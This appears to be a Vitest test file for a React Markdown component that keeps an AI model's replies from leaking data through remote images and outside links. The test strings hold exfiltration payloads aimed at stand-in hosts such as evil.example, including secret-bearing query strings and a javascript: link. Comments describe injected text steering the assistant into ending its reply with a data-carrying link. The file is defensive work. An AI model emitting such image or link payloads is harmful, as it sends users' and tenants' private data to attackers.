import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { Markdown, sameOriginPath } from "./markdown";

describe("Markdown", () => {
  /**
   * WP-103: a Markdown image in model output is fetched the moment it renders — a zero-click way
   * to send tenant data to any host. It must render as text, with no <img> at all.
   */
  it("never renders a remote image", () => {
    const { container } = render(
      <Markdown>{"Totals below. ![pixel](https://evil.example/p?d=secret)"}</Markdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[pixel]");
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("drops an image with no alt text entirely", () => {
    const { container } = render(<Markdown>{"![](https://evil.example/p)"}</Markdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("still renders ordinary Markdown", () => {
    const { container } = render(<Markdown>{"**bold** and a [link](https://example.com)"}</Markdown>);
    expect(container.querySelector("strong")?.textContent).toBe("bold");
    expect(container.querySelector("a")?.getAttribute("href")).toBe("https://example.com");
  });
});

/**
 * AI-21 / AI-59: in an assistant reply, only links into the app are live. Text any employee can
 * write reaches the model, and "end with [Open the report](https://x/?d=…)" made a click a way out.
 */
describe("Markdown links=\"same-origin\"", () => {
  const appPaths = new Set(["/attendance", "/settings/organization"]);
  const isAppPath = (p: string) => appPaths.has(p.split(/[?#]/)[0]);
  const renderReply = (md: string) =>
    render(
      <Markdown links="same-origin" isAppPath={isAppPath}>
        {md}
      </Markdown>,
    );

  it("renders a link to another host as plain text with its address shown, and no anchor", () => {
    const { container } = renderReply(
      "Done. [Open the full report](https://x.example/?d=Alice%20earns%205040000)",
    );
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("Open the full report");
    expect(container.textContent).toContain("(https://x.example/?d=Alice%20earns%205040000)");
  });

  it("never auto-links a bare external URL or www. address", () => {
    const { container } = renderReply("See https://evil.example/p?d=1 or www.evil.example now.");
    expect(container.querySelector("a")).toBeNull();
    // Shown once — an autolink is its own label.
    expect(container.textContent).toBe("See https://evil.example/p?d=1 or www.evil.example now.");
  });

  it("refuses look-alike same-origin spellings and non-web schemes", () => {
    const { container } = renderReply(
      [
        "[a](//evil.example/x)",
        "[c](mailto:boss@evil.example)",
        "[d](javascript:alert(1))",
        "[e](attendance)",
      ].join(" "),
    );
    expect(container.querySelector("a")).toBeNull();
    expect(container.innerHTML).not.toContain("href");
  });

  it("keeps a backslash spelling on our own origin", () => {
    // Browsers read `/\host` as `//host`. Markdown percent-encodes the backslash first, so what
    // reaches the anchor is a path on this origin — and that is all it may ever be.
    const { container } = renderReply("[b](/\\evil.example/x)");
    const href = container.querySelector("a")?.getAttribute("href") ?? "";
    expect(new URL(href, "https://app.example").origin).toBe("https://app.example");
    expect(href.startsWith("//")).toBe(false);
  });

  it("keeps an in-app link live, navigating in place", () => {
    const { container } = renderReply("Check [Attendance](/attendance?date=2026-10-20) for details.");
    const a = container.querySelector("a");
    expect(a?.getAttribute("href")).toBe("/attendance?date=2026-10-20");
    expect(a?.getAttribute("target")).toBeNull();
    expect(a?.textContent).toBe("Attendance");
  });

  it("turns a same-origin absolute URL into its path", () => {
    const { container } = renderReply(`[Attendance](${window.location.origin}/attendance)`);
    expect(container.querySelector("a")?.getAttribute("href")).toBe("/attendance");
  });

  it("renders an in-app path written as code as a link to it (AI-59)", () => {
    const { container } = renderReply(
      "See the **Attendance** page: `/attendance`. Departments: `/settings/organization#departments`.",
    );
    const hrefs = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
    expect(hrefs).toEqual(["/attendance", "/settings/organization#departments"]);
    expect(container.querySelector("a code")?.textContent).toBe("/attendance");
  });

  it("leaves code that isn't an app page as code", () => {
    const { container } = renderReply("The route is `/v1/assistant/messages`, and `//evil.example`.");
    expect(container.querySelector("a")).toBeNull();
    expect(container.querySelectorAll("code")).toHaveLength(2);
  });
});

describe("sameOriginPath", () => {
  it("accepts rooted paths and our own origin only", () => {
    expect(sameOriginPath("/attendance")).toBe("/attendance");
    expect(sameOriginPath("/a/b?x=1#y")).toBe("/a/b?x=1#y");
    expect(sameOriginPath("https://app.example/leave", "https://app.example")).toBe("/leave");
    expect(sameOriginPath("https://other.example/leave", "https://app.example")).toBeNull();
    expect(sameOriginPath("//other.example/x")).toBeNull();
    expect(sameOriginPath("/\\other.example/x")).toBeNull();
    expect(sameOriginPath("relative/path")).toBeNull();
    expect(sameOriginPath("#top")).toBeNull();
    expect(sameOriginPath("")).toBeNull();
    expect(sameOriginPath(undefined)).toBeNull();
  });
});
